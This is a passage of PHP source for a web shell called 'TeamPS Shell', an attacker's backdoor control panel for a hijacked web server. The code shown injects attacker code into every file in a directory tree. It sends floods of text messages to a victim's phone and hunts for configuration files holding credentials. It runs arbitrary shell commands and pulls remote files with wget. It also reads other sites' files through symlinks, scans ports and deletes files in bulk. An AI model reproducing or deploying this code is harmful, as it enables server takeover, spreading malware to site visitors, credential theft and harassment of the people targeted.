            $file2 = trim($file, ".");
            $getinf_file = file_get_contents($file2);
            if ("$file2" == "$dir/$script2") {
                echo "";
            } else {
                if (file_put_contents("$file2", $masscode) && file_put_contents("$file2", $getinf_file, FILE_APPEND)) {
                    echo "<font color='green'><b>Successfully infected file: $file2</b></font><br>";
                    $success++;
                } else {
                    echo "<font color='red'><b>Failed to infect file: $file2</b></font><br>";
                    $failed++;
                }
            }
        }
        echo "<font color='#14ab00'><b>$success files successfully infected!<br>Failed to infect $failed files!</b></font><br>";
    }
}
if (isset($_GET['massinfect'])) {
    $example = "<?php system() ?>";
    $example = htmlspecialchars($example);
    $example2 = "<script>alert()</script>";
    $example2 = htmlspecialchars($example2);
    echo "<center>
<font color='#14ab00'>
<form action='' method='post'>
Directory to start infect from:<br>
<select name='infect_dir'>
<option value='root'>Root</option>
<option value='custom'>Custom</option>
</select><br>
Custom Directory: <input class='text' type='text' name='cinfect_dir' size='40'><br>
This is great for infecting mass files with javascript scripts or php scripts<br>
It will append the code to the top of each file.<br>
Example:<br>
$example<br>
$example2<br>
Infect code:<br>
<textarea rows='20' cols='150' name='massinfect_code' style='color:#000'>
</textarea><br>
This will not infect this shell.<br>
<input type='submit' name='do_mass_infect' value='Infect'><br>
</form>
</font>
</center>";
}
//SMS Bomber stuff
if (isset($_POST['do_bomb_sms'])) {
    $phonenum = $_POST['phnumber'];
    $carrier = $_POST['carrier'];
    $amount = $_POST['numberof'];
    $from = $_POST['from'];
    $headers = "From: $from\r\n";
    $headers.= 'MIME-Version: 1.0' . "\n";
    $headers.= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $subject = $_POST['subject'];
    $to = "$phonenum$carrier";
    $numsent = 0;
    $sent_fail = 0;
    $sent_success = 0;
    $msgcontent = $_POST['message_content'];
    if (empty($phonenum) OR empty($amount) OR empty($from) OR empty($subject) OR empty($msgcontent)) {
        error("All Fields Must Entered!");
    } else {
        while ($numsent < $amount) {
            if (!@mail($to, $subject, $msgcontent, $headers)) {
                $numsent++;
                $sent_fail++;
            } else {
                $numsent++;
                $sent_success++;
            }
        }
        echo "<font color='#14ab00'>Successfully sent $sent_success messages.<br>
Failed to send $sent_fail messages.<br>";
    }
}
if (isset($_GET['sms'])) {
    echo "<font color='#14ab00'>
<table class='noborder'>
<tr>
<form action='' method='post'>
<td>Phone Number With Area Code</td>
<td><input type='text' name='phnumber' class='text'></td>
</tr>
<tr>
<td>Carrier:</td>
<td>
<select name='carrier'>
<option value='@sms.3rivers.net'>3 River Wireless</option>
<option value='@paging.acswireless.com'>ACS Wireless</option>
<option value='@advantagepaging.com'>Advantage Communications</option>
<option value='@airtelkk.com'>Airtel (Karnataka, India)</option>
<option value='@sms.airtelmontana.com'>Airtel Wireless (Montana, USA)</option>
<option value='@airtouch.net'>Airtouch Pagers</option>
<option value='@airtouchpaging.com'>Airtouch Pagers</option>
<option value='@alphapage.airtouch.com'>Airtouch Pagers</option>
<option value='@myairmail.com'>Airtouch Pagers</option>
<option value='@msg.acsalaska.com'>Alaska Communications Systems</option>
<option value='@message.alltel.com'>Alltel</option>
<option value='@alphanow.net'>AlphaNow</option>
<option value='@page.americanmessaging.net'>American Messaging</option>
<option value='@clearpath.acswireless.com'>Ameritech Clearpath</option>
<option value='@paging.acswireless.com'>Ameritech Paging</option>
<option value='@pageapi.com'>Ameritech Paging</option>
<option value='@airtelap.com'>Andhra Pradesh Airtel</option>
<option value='@text.aql.com'>Aql</option>
<option value='@archwireless.net'>Arch Pagers (PageNet)</option>
<option value='@epage.arch.com'>Arch Pagers (PageNet)</option>
<option value='@mobile.att.net'>AT&T</option>
<option value='@txt.att.net'>AT&T2</option>
<option value='@page.att.net'>AT&T Enterprise Paging</option>
<option value='@mmode.com'>AT&T Free2Go</option>
<option value='@mobile.att.net'>AT&T PCS</option>
<option value='@dpcs.mobile.att.net'>AT&T Pocketnet PCS</option>
<option value='@sms.beemail.ru'>BeeLine GSM</option>
<option value='@beepwear.net'>Beepwear</option>
<option value='@message.bam.com'>Bell Atlantic</option>
<option value='@bellmobility.ca'>Bell Canada</option>
<option value='@txt.bellmobility.ca'>Bell Canada2</option>
<option value='@txt.bell.ca'>Bell Mobility (Canada)</option>
<option value='@bellsouth.cl'>Bell South</option>
<option value='@blsdcs.net'>Bell South2</option>
<option value='@sms.bellsouth.com'>Bell South3</option>
<option value='@wireless.bellsouth.com'>Bell South4</option>
<option value='@bellsouthtips.com'>Bell South (Blackberry)</option>
<option value='@blsdcs.net'>Bell South Mobility</option>
<option value='@tachyonsms.co.uk'>BigRedGiant Mobile Solutions</option>
<option value='@blueskyfrog.com'>Blue Sky Frog</option>
<option value='@sms.bluecell.com'>Bluegrass Cellular</option>
<option value='@myboostmobile.com'>Boost</option>
<option value='@bplmobile.com'>BPL Mobile</option>
<option value='@@bplmobile.com'>BPL Mobile (Mumbai, India)</option>
<option value='@cmcpaging.com'>Carolina Mobile</option>
<option value='@cwwsms.com'>Carolina West Wireless</option>
<option value='@cell1.textmsg.com'>Cellular One</option>
<option value='@cellularone.textmsg.com'>Cellular One2</option>
<option value='@message.cellone-sf.com'>Cellular One3</option>
<option value='@mobile.celloneusa.com'>Cellular One4</option>
<option value='@sbcemail.com'>Cellular One5</option>
<option value='@phone.cellone.net'>Cellular One (East Coast)</option>
<option value='@swmsg.com'>Cellular One (South West)</option>
<option value='@mycellone.com'>Cellular One (West)</option>
<option value='@paging.cellone-sf.com'>Cellular One PCS</option>
<option value='@csouth1.com'>Cellular South</option>
<option value='@cwemail.com'>Centennial Wireless</option>
<option value='@cvcpaging.com'>Central Vermont</option>
<option value='@messaging.centurytel.net'>CenturyTel</option>
<option value='@rpgmail.net'>Chennai RPG Cellular</option>
<option value='@airtelchennai.com'>Chennai Skycell / Airtel</option>
<option value='@gocbw.com'>Cincinnati Bell</option>
<option value='@cingularme.com'>Cingular</option>
<option value='@mms.cingularme.com'>Cingular2</option>
<option value='@mycingular.com'>Cingular3</option>
<option value='@page.cingular.com'>Cingular5</option>
<option value='@txt.att.net'>Cingular (Now AT&T)</option>
<option value='@clarotorpedo.com.br'>Claro (Brasil)</option>
<option value='@ideasclaro-ca.com'>Claro (Nicaragua)</option>
<option value='@msg.clearnet.com'>Clearnet</option>
<option value='@comcastpcs.textmsg.com'>Comcast</option>
<option value='@comcel.com.co'>Comcel</option>
<option value='@sms.comviq.se'>Comviq</option>
<option value='@cookmail.com'>Cook Paging</option>
<option value='@corrwireless.net'>Corr Wireless Communications</option>
<option value='@sms.mycricket.com'>Cricket</option>
<option value='@sms.ctimovil.com.ar'>CTI</option>
<option value='@airtelmail.com'>Delhi Aritel</option>
<option value='@delhi.hutch.co.in'>Delhi Hutch</option>
<option value='@page.hit.net'>Digi-Page / Page Kansas</option>
<option value='@mobile.dobson.net'>Dobson</option>
<option value='@sms.orange.nl'>Dutchtone / Orange-NL</option>
<option value='@sms.edgewireless.com'>Edge Wireless</option>
<option value='@sms.emt.ee'>EMT</option>
<option value='@emtelworld.net'>Emtel (Mauritius)</option>
<option value='@escotelmobile.com'>Escotel</option>
<option value='@fido.ca'>Fido</option>
<option value='@epage.gabrielwireless.com'>Gabriel Wireless</option>
<option value='@sendabeep.net'>Galaxy Corporation</option>
<option value='@webpager.us'>GCS Paging</option>
<option value='@msg.gci.net'>General Communications Inc.</option>
<option value='@t-mobile-sms.de'>German T-Mobile</option>
<option value='@msg.globalstarusa.com'>Globalstar (satellite)</option>
<option value='@bplmobile.com'>Goa BPLMobil</option>
<option value='@sms.goldentele.com'>Golden Telecom</option>
<option value='@epage.porta-phone.com'>GrayLink / Porta-Phone</option>
<option value='@celforce.com'>Gujarat Celforce</option>
<option value='@messaging.sprintpcs.com'>Helio</option>
<option value='@text.houstoncellular.net'>Houston Cellular</option>
<option value='@ideacellular.net'>Idea Cellular</option>
<option value='@ivctext.com'>Illinois Valley Cellular</option>
<option value='@page.infopagesystems.com'>Infopage Systems</option>
<option value='@inlandlink.com'>Inland Cellular Telephone</option>
<option value='@msg.iridium.com'>Iridium (satellite)</option>
<option value='@rek2.com.mx'>Iusacell</option>
<option value='@jsmtel.com'>JSM Tele-Page</option>
<option value='@msg.koodomobile.com'>Koodo Mobile (Canada)</option>
<option value='@mci.com'>MCI Phone</option>
<option value='@sms.mymeteor.ie'>Meteor</option>
<option value='@metropcs.sms.us'>Metro PCS</option>
<option value='@clearlydigital.com'>Midwest Wireless</option>
<option value='@mobilecomm.net'>Mobilcomm</option>
<option value='@text.mtsmobility.com'>MTS</option>
<option value='@sms.netcom.no'>Netcom</option>
<option value='@messaging.nextel.com'>Nextel</option>
<option value='@o2.co.uk'>O2</option>
<option value='@o2imail.co.uk'>O2#2</option>
<option value='@mmail.co.uk'>O2 (M-mail)</option>
<option value='@orange.net'>Orange</option>
<option value='@qwestmp.com'>Qwest</option>
<option value='@pcs.rogers.com'>Rogers</option>
<option value='@sms.sasktel.com'>Sasktel (Canada)</option>
<option value='@mysmart.mymobile.ph'>Smart Telecom</option>
<option value='@messaging.sprintpcs.com'>Sprint</option>
<option value='@tms.suncom.com'>Sumcom</option>
<option value='@tmomail.net'>T-Mobile</option>
<option value='@t-mobile.uk.net'>T-Mobile (UK)</option>
<option value='@t-d1-sms.de'>T-Mobile Germany</option>
<option value='@txt.att.net'>Tracfone</option>
<option value='@mmst5.tracfone.com'>Tracfone (prepaid)</option>
<option value='@vtext.com'>Verizon</option>
<option value='@vmobl.com'>Virgin Mobile</option>
<option value='@vmobile.ca'>Virgin Mobile (Canada)</option>
<option value='@vodafone.net'>Vodafone UK</option>
</select>
</td>
</tr>
<tr>
<td>Amount Of Messages To Send:</td> 
<td><input type='text' name='numberof' size='10' class='text'></td>
</tr>
<tr>
<td>From:</td> 
<td><input type='text' name='from' class='text'></td>
</tr>
<tr>
<td>Subject:</td>
<td><input type='text' size='85' class='text' name='subject'></td>
</tr>
</table>
Message Content:<br>
<textarea rows='20' cols='150' name='message_content' style='color:#000000'>
</textarea><br>
<input type='submit' name='do_bomb_sms' value='Bomb'><br>
</form><br></font><br>";
}
//Config finder
if (isset($_GET['config'])) {
    $configs_found = 0;
    foreach (files($rootdir) as $key => $cfile) {
        $file2 = trim($cfile, ".");
        $cex = explode("/", $file2);
        $cex2 = end($cex);
        if (preg_match('/config/', $cex2)) {
            echo "<a class='navbar' href='http://$domain$script?editfile=$file2'>$file2</a><br>";
            $configs_found++;
        }
    }
    if ($configs_found == "0") {
        error("No configuration files found!");
    } else {
        echo "<font color='#14ab00'>$configs_found Configuration files found!</font><br><br>";
        success("configs_found", $configs_found);
    }
}
//Search
if (isset($_GET['search'])) {
    echo "<center><font color='#14ab00' size='3'>
<form action='' method='post'>
Directory to search in:<br>
<input type='text' name='search_dir' class='text' size='50' value='$dir'><br>
Value to search for:<br>
<input type='text' name='search_value' class='text'><br>
<input type='submit' name='do_search' value='Search'>
</form>
</font>
</center>";
}
if (isset($_POST['do_search'])) {
    $searchdir = $_POST['search_dir'];
    $searchval = $_POST['search_value'];
    $matches = 0;
    foreach (files($searchdir) as $key => $cfile) {
        $file2 = trim($cfile, ".");
        $cex = explode("/", $file2);
        $cex2 = end($cex);
        if (preg_match('/' . $searchval . '/', $cex2)) {
            echo "<a class='navbar' href='http://$domain$script?editfile=$file2'>$file2</a><br>";
            $matches++;
        }
    }
    if ($matches == 0) {
        error("No files that match $searchval");
    } else {
        echo "<font color='#14ab00' size='3'>$matches files found that match $searchval</font><br>";
        success("files_found", $matches);
    }
}
//Unzip
if (isset($_GET['unzipfile'])) {
    $unzipfile = $_GET['unzipfile'];
    $redir = dirname($unzipfile);
    unzip($unzipfile, rtrim($redir, '/'));
}
//Exectue Command
if (isset($_POST['do_exe_command'])) {
    $ecmd = $_POST['exe_command'];
    $exe_cmd = cmd2($ecmd, $dir);
    echo "<center><font color='#14ab00'>
<form action='' method='post'>
<input type='text' class='text' name='exe_command' size='60'>
<input type='submit' name='do_exe_command' value='Execute'><br>
</form>
Result:<br>
<textarea rows='20' cols='150' name='massdeface_source' style='color:#000'>
$exe_cmd
</textarea></font></center><br><br>";
}
//wget file
if (isset($_POST['do_wget_file'])) {
    $wget_file = $_POST['wget_file'];
    $wecmd = "wget $wget_file";
    $wget_ecmd = cmd2($wecmd, $dir);
    echo "<center><font color='#14ab00'>
Result:<br>
<textarea rows='20' cols='150' name='massdeface_source' style='color:#000'>
$wget_ecmd
</textarea></font></center><br><br>";
}
//Domain information
//Get domains hosted on server from yougetsignal.com
if (isset($_GET['domaininfo'])) {
    echo "<font color='#14ab00' size='3'>";
    $dns_record = dns_get_record($domain, DNS_ANY, $authns, $addtl);
    $num = 0;
    $count = sizeof($dns_record);
    echo "<br>Name Servers:</b><br>";
    while ($num < $count) {
        $name_servers = $dns_record[$num];
        $name_servers2 = $name_servers['type'];
        $name_servers3 = @$name_servers['target'];
        $num++;
        if ($name_servers2 == "NS") {
            echo "$name_servers3<br>";
            $nshost = @$name_servers['host'];
        }
        if ($name_servers2 == "SOA") {
            $nsemail = $name_servers['rname'];
        }
        if ($name_servers2 == "A") {
            $nsip = $name_servers['ip'];
        }
    }
    $num = 0;
    echo "<br><table class='noborder'>
<tr>
<td><b>Host:</b></td>
<td>$nshost</td>
</tr>
<tr>
<td><b>IP:</b></td>
<td>$nsip</td>
</tr>
<tr>
<td><b>Email:</b></td>
<td>$nsemail</td>
</tr>
</table><br>";
    $domains_on_server = json_decode(file_get_contents("http://www.yougetsignal.com/tools/web-sites-on-web-server/php/testing.php?remoteAddress=$domain"));
    $status = $domains_on_server->status;
    $message = $domains_on_server->message;
    $domainAr = $domains_on_server->domainArray;
    $num_of_site = $domains_on_server->domainCount;
    $count = sizeof($domainAr);
    if ($status == "Success") {
        echo "Found $num_of_site sites hosted on the same server as $nshost($nsip) via <a class='navbar' href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>:<br><br> <table class='noborder'>";
        while ($num < $count) {
            $hossites = $domainAr[$num];
            $num++;
            $hossites3 = $domainAr[$num];
            $hossites3 = $hossites3[0];
            $hossites = $hossites[0];
            $site_ips = empty($hossites) ? "" : "(" . gethostbyname($hossites) . ")";
            $site_ips2 = empty($hossites3) ? "" : "(" . gethostbyname($hossites3) . ")";
            echo "<tr><td><a class='navbar' href='http://$hossites'>$hossites</a> $site_ips</td><td><a class='navbar' href='http://$hossites3'>$hossites3</a> $site_ips2</td></tr>";
            $num++;
        }
        echo "</table><br>";
        $num = 0;
    } else {
        error("Failed to find or get sites hosted on same server from: <a class='navbar' href='http://www.yougetsignal.com/tools/web-sites-on-web-server/'>www.yougetsignal.com</a>!<br>Additional Message:<br>$message");
    }
    echo "</font><br>";
}
//Encrypt string
if (isset($_GET['encrypt'])) {
    echo "<form action='' method='post'>
<center><font color='#14ab00'>
<input type='text' name='en_string' class='text'>
<input type='submit' name='do_encrypt' value='Encrypt String'>
</form>
</font></center>";
}
if (isset($_POST['do_encrypt'])) {
    $vbsalt = gen_salt("30");
    $vbsalt2 = gen_salt("3");
    $mybbsalt = gen_salt("8");
    $ipbsalt = gen_salt("5");
    $joomlasalt = gen_salt("32");
    $password = $_POST['en_string'];
    $md5 = md5($password);
    $md52 = md5(md5($password));
    $md53 = md5(md5(md5($password)));
    $sha1 = sha1($password);
    $sha256 = hash('sha256', $password);
    $vbalg = md5(md5($password) . $vbsalt);
    $vbalg2 = md5(md5($password) . $vbsalt2);
    $mybbalg = md5(md5($mybbsalt) . $password);
    $ipbalg = md5(md5($ipbsalt) . md5($password));
    $joomlaalg = md5($password . $joomlasalt);
    $en_result = "Hashes for string: $password\nMD5: $md5\nmd5(md5(pass)): $md52\nmd5(md5(md5(pass))): $md53\nSHA-1: $sha1\nSHA-256: $sha256\nvBulletin 4: $vbalg:$vbsalt\nvBulletin 3: $vbalg2:$vbsalt2\nMyBB: $mybbalg:$mybbsalt\nIPB: $ipbalg:$ipbsalt\nJoomla 1.0.13+: $joomlaalg:$joomlasalt\n";
    echo "<center>
<textarea rows='20' cols='150' style='color:#000'>
$en_result
</textarea>
</center><br>";
}
//Symlink Stuff
if (isset($_GET['symlink'])) {
    echo "<center><font color='#14ab00'>
<form action='' method='post'>
Directory To Symlink:<br>
<input type='text' name='sym_dir' class='text' size='40'>
<input type='submit' name='do_sym' value='Create Symlink'>
</form><br>";
    if (isset($_POST['do_sym'])) {
        $symdir = rtrim($_POST['sym_dir'], '/');
        $symdir3 = trim($_POST['sym_dir'], '/');
        $symdir2 = str_replace("/", "-", $symdir3);
        if (!is_dir("$dir/ssym")) {
            if (mkdir("$dir/ssym")) {
                $htaccess = "Options Indexes FollowSymLinks\nDirectoryIndex sssss.htm\nAddType txt .php\nAddHandler txt .php";
                if (file_put_contents("$dir/ssym/.htaccess", $htaccess)) {
                } else {
                    error("Failed to make .htaccess file!");
                }
                cmd2("ln -s $symdir/ $symdir2", "$dir/ssym");
                echo "<center><a class='navbar' href='./ssym/$symdir2'>$symdir/</a></center>";
            } else {
                error("Failed to make symlink directory");
            }
        } else {
            cmd2("ln -s $symdir/ $symdir2", "$dir/ssym");
            echo "<center><a class='navbar' href='./ssym/$symdir2'>$symdir</a></center><br>";
        }
    }
    $opensymdir = opendir("$dir/ssym");
    $symdirs = array();
    while ($symfile = readdir($opensymdir)) {
        if ($symfile != "." && $file != "..") {
            if (is_link("$dir/ssym/$symfile")) {
                array_push($symdirs, $symfile);
            } else {
            }
        }
    }
    if (empty($symdirs)) {
        error("No symlinks found!");
    } else {
        echo "<b>Symlink's Found!</b><br><table class='noborder'>
<tr>
<th>Link</th>
<th>Link</th>
</tr>";
        $numsym = count($symdirs);
        $num = 0;
        while ($num < $numsym) {
            $symmdir = $symdirs[$num];
            $num++;
            $symmdir2 = $symdirs[$num];
            $num++;
            $symd = readlink("$dir/ssym/$symmdir");
            $symd2 = readlink("$dir/ssym/$symmdir2");
            echo "<tr><td><a href='./ssym/$symmdir' class='navbar'>$symd</a></td><td><a href='./ssym/$symmdir2' class='navbar'>$symd2</a></td></tr>";
        }
    }
    echo "</table><br>
</font></center>";
}
//Port scan
if (isset($_GET['scan'])) {
    echo "<center><font color='#14ab00' size='3'>
Port Scan:<br>
<form action='' method='post'>
Host: <input type='text' name='scan_host' class='text' value='$domain'><br>
Start port: <input type='text' name='start_port' class='text' size='6'>
End port: <input type='text' name='end_port' class='text' size='7'><br>
<input type='submit' name='start_scan' value='Scan'>
</form>
</font>
</center>";
}
if (isset($_POST['start_scan'])) {
    $scanhost = $_POST['scan_host'];
    $startport = $_POST['start_port'];
    $endport = $_POST['end_port'];
    while ($startport <= $endport) {
        if (fsockopen($scanhost, $startport, $errno, $errstr, 3)) {
            echo "<font color='green' size='3'>Port $startport is open on $scanhost</font><br>";
        } else {
            echo "<font color='red' size='3'>Port $startport is not open on $scanhost</font><br>";
        }
        $startport++;
    }
}
//Don't put anything you don't want to be echo'd
//out between the misc system bar and misc file bar
//here!
//echo out misc file bar.
$wr = is_writeable($dir) ? "<font color='green'><b>[ Writeable ]</b></font>" : "<font color='red'><b>[ Non Writeable ]</b></font>";
echo "<table border='1' width='100%' frame='void'>
<tr>
<td>
<center>
Create directory:<br>
<form action='' method='post'>
<input type='text' class='textround' name='create_dir' value='$dir/newdir' size='50'>
<input type='submit' name='do_create_dir' value='Create'><br>
$wr
</form>
</center>
</td>
<td>
<center>
Create file:<br>
<form action='' method='post'>
<input type='text' class='textround' name='create_file' value='$dir/newfile.php' size='50'>
<input type='submit' name='do_create_file' value='Create'><br>
$wr
</form>
</center>
</td>
</tr>
<tr>
<td>
<center>
Go to directory:<br>
<form action='' method='post'>
<input type='text'class='textround' name='go_dir' value='/tmp' size='50'>
<input type='submit' name='do_go_dir' value='Go'><br>
</form>
</center>
</td>
<td>
<center>
Edit file:<br>
<form action='' method='post'>
<input type='text' class='textround' name='go_edit_file' value='$dir/index.php' size='50'>
<input type='submit' name='do_go_edit' value='Edit'><br>
</form>
</center>
</td>
</tr>
<tr>
<td>
<center>
<form action='' method='post' enctype='multipart/form-data'>
Upload to location:<br>
<input type='text' class='text' style='width: 300px' value='$dir/' name='upload_location'></br><input type='file' name='upload_file'>
<input type='submit' value='Upload' name='do_upload_file'><br>
$wr
</form>
</center>
</td>
<td>
<center>
<form action='' method='post'>
wget file:<br>
<input type='text' name='wget_file' class='text' size='50' value='http://'>
<input type='submit' name='do_wget_file' value='wget'>
</form>
</center>
</td>
</tr>
<table border='1' frame='void' width='100%'>
<tr>
<td>
<center>
<form action='' method='post'>
Execute Command:<br>
<input type='text' class='text' name='exe_command' size='60'>
<input type='submit' name='do_exe_command' value='Execute'><br>
</form>
</center>
</td>
</tr>
</table>
<br><br><br>";
//echo out files
echo "<table border='1' width='100%' frame='void'>
<tr>
<th>
Current Directory: ";
$ex = explode("/", $dir);
for ($p = 0;$p < count($ex);$p++) {
    @$linkpath.= $ex[$p] . '/';
    $linkpath2 = rtrim($linkpath, "/");
    echo "<a href=http://$domain$script?path=$linkpath2>$ex[$p]</a>/";
}
echo "</th>
</tr>
</table>
<div id='hover'>
<table border='1' width='100%'>
<form action='' method='post' id='checkboxall'>
<tr>
<th>Directory/File Name</th>
<th>Owner/Group</th>
<th>Permissions</th>
<th>Writeable</th>
<th>Size</th>
<th>Last Modified</th>
<th>Delete</th>
<th>Rename</th>
<th>Mass</th>
</tr>
";
foreach ($direcs as $d) {
    $downer = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner("$dir/$d")) : fileowner("$dir/$d");
    $dgroup = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup("$dir/$d")) : filegroup("$dir/$d");
    if (is_array($downer)) {
        $downer = $downer['name'];
    }
    if (is_array($dgroup)) {
        $dgroup = $dgroup['name'];
    }
    $dperms = substr(base_convert(fileperms("$dir/$d"), 10, 8), 2);
    $dwrite = is_writeable("$dir/$d") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
    $dsize = "Directory";
    $dtime = date("F d Y g:i:s", filemtime("$dir/$d"));
    echo "<tr>
<td><a href='http://$domain$script?path=$dir/$d'>$d</a></td>
<td style='text-align: center;'>$downer/$dgroup</td>
<td style='text-align: center;'>$dperms</td>
<td style='text-align: center;'>$dwrite</td>
<td style='text-align: center;'>$dsize</td>
<td style='text-align: center;'>$dtime</td>
<td style='text-align: center;'><a href='http://$domain$script?deldir=$dir/$d'>Delete</a></td>
<td style='text-align: center;'><a href='http://$domain$script?rendir=$dir&old=$d'>Rename</a></td>
<td style='text-align: center;'><input name='delbox[]' type='checkbox' id='delbox' value='$dir/$d'></td>
</tr>";
}
foreach ($files as $f) {
    $fowner = function_exists("posix_getpwuid") ? posix_getpwuid(fileowner("$dir/$f")) : fileowner("$dir/$f");
    $fgroup = function_exists("posix_getgrgid") ? posix_getgrgid(filegroup("$dir/$f")) : filegroup("$dir/$f");
    if (is_array($fowner)) {
        $fowner = $fowner['name'];
    }
    if (is_array($fgroup)) {
        $fgroup = $fgroup['name'];
    }
    $fperms = substr(base_convert(fileperms("$dir/$f"), 10, 8), 2);
    $fwrite = is_writeable("$dir/$f") ? "<font color='green'><b>Writeable</b></font>" : "<font color='red'><b>Non Writeable</b></font>";
    $fsize = ByteConversion(filesize("$dir/$f"));
    $ftime = date("F d Y g:i:s", filemtime("$dir/$f"));
    $zip_file = explode(".", $f);
    $zip_file2 = end($zip_file);
    echo "<tr>";
    if ($zip_file2 == "zip") {
        echo "<td><a href='http://$domain$script?unzipfile=$dir/$f'>$f</td>";
    } else {
        echo "<td><a href='http://$domain$script?editfile=$dir/$f'>$f</td>";
    }
    echo "<td style='text-align: center;'>$fowner/$fgroup</td>
<td style='text-align: center;'>$fperms</td>
<td style='text-align: center;'>$fwrite</td>
<td style='text-align: center;'>$fsize</td>
<td style='text-align: center;'>$ftime</td>
<td style='text-align: center;'><a href='http://$domain$script?delfile=$dir/$f'>Delete</a></td>
<td style='text-align: center;'><a href='http://$domain$script?renfile=$dir&old=$f'>Rename</a></td>
<td style='text-align: center;'><input name='delbox[]' type='checkbox' id='delbox' value='$dir/$f'></td>
</tr>";
}
echo "</table></div>";
echo "<div id='bottom'><font color='#14ab00'>With all selected:</font><br>
<input type='button' onclick='checkall();' value='Select/Unselect All'>
<select name='mass_action'>
<option value='Delete'>Delete</option>
<option value='chmod'>chmod</option>
</select>
<input type='text' name='chmod_value' class='text' value='chmod value' size='9' id='ch' onfocus='removeValue()'>
<input type='submit' name='mass_files'><br></div>";
echo "</form>";
closedir();
?>
<title>TeamPS Shell</title>
<!-- CSS Start !-->
<style type="text/css">
    a:link {color: #FFFFFF; text-decoration: none; }
    a:active {color: #FFFFFF; text-decoration: none; }
    a:visited {color: #FFFFFF; text-decoration: none; }
    a:hover {color: #000000; text-decoration: none; }
	a.navbar:link {color: #FFFFFF; text-decoration: none; }
	a.navbar:visited {color: #FFFFFF; text-decoration: none; }
	a.navbar:active {color: #FFFFFF; text-decoration: none; }
	a.navbar:hover {color: #303030; text-decoration: none; }
    body {
        background: #121212 url(http://www.p0wersurge.com/forums/images/pscustom/new/ps5skin-min.png) center top repeat-x;
        font-family: consolas;
        font-weight: bold;
        font-size: 12px;
        color:#000000;
    }
    table
    {
        border-width: 2px;
        border-spacing: 2px;
        border-style: solid;
        border-color: #14ab00;
        background-color: #303030;
    }
	#hover tr:hover{
		background-color: #14ab00;
	}
	.noborder, .noborder tr, .noborder th, .noborder td { border: none; background-color: transparent; color: #14ab00;}
    table.th {
        padding: 1px;
        border-color: #303030;
        background-color: #303030;
    }
    table.td {
        padding: 1px;
        border-color: #303030;
        background-color: #303030;
    }
    textarea {
        border: 3px solid #14ab00;
        padding: 3px;
        background-color: #303030;
        outline-color:#14ab00;
        resize: none;
    }
	.text {
        border: 2px solid #14ab00;
        padding: 3px;
        background-color: #303030;
        outline-color:#14ab00;
	}
	.textround {
        border: 2px solid #14ab00;
        padding: 3px;
        background-color: #303030;
        outline-color:#14ab00;
		-webkit-border-top-left-radius: 7px;
		-khtml-border-radius-topleft: 7px;	
		-moz-border-radius-topleft: 7px;
		border-top-left-radius: 7px;
		-webkit-border-bottom-right-radius: 7px;
		-khtml-border-radius-bottomright: 7px;	
		-moz-border-radius-bottomright: 7px;
		border-bottom-right-radius: 7px;
		-webkit-border-bottom-left-radius: 7px;
		-khtml-border-radius-bottomleft: 7px;	
		-moz-border-radius-bottomleft: 7px;
		border-bottom-left-radius: 7px;
		-webkit-border-top-right-radius: 7px;
		-khtml-border-radius-topright: 7px;	
		-moz-border-radius-topright: 7px;
		border-bottom-top-radius: 7px;
	}
	#xbox {
		width: 100%; 
		position: fixed; 
		bottom: 0; 
		left: 0; 
		height: 70px; 
		padding: 5px;
		text-align: center;
	}
	#bottom{
	position:absolute;
	right:0%;
}
/* This imageless css button was generated by CSSButtonGenerator.com */
input[type=submit], input[type=button] {
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #14ab00), color-stop(1, #0f6f00) );
	background:-moz-linear-gradient( center top, #14ab00 5%, #0f6f00 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#14ab00', endColorstr='#0f6f00');
	background-color:#14ab00;
	-moz-border-radius:6px;
	-webkit-border-radius:6px;
	border-radius:6px;
	border:1px solid #303030;
	display:inline-block;
	color:#000000;
	font-family:arial;
	font-size:12px;
	font-weight:bold;
	padding:5px 10px;
	text-decoration:none;
}input[type=submit]:hover, input[type=button]:hover {
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #0f6f00), color-stop(1, #14ab00) );
	background:-moz-linear-gradient( center top, #0f6f00 5%, #14ab00 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0f6f00', endColorstr='#14ab00');
	background-color:#0f6f00;
}input[type=submit]:active, input[type=button]:active {
	position:relative;
	top:1px;
}
</style>
<script type="text/javascript">
function removeValue() {
document.getElementById('ch').value='';
}
checked=false;
function checkall (checkboxall) {
	var aa= document.getElementById('checkboxall');
	 if (checked == false)
          {
           checked = true
          }
        else
          {
          checked = false
          }
	for (var i =0; i < aa.elements.length; i++) 
	{
	 aa.elements[i].checked = checked;
	}
      }
</script>
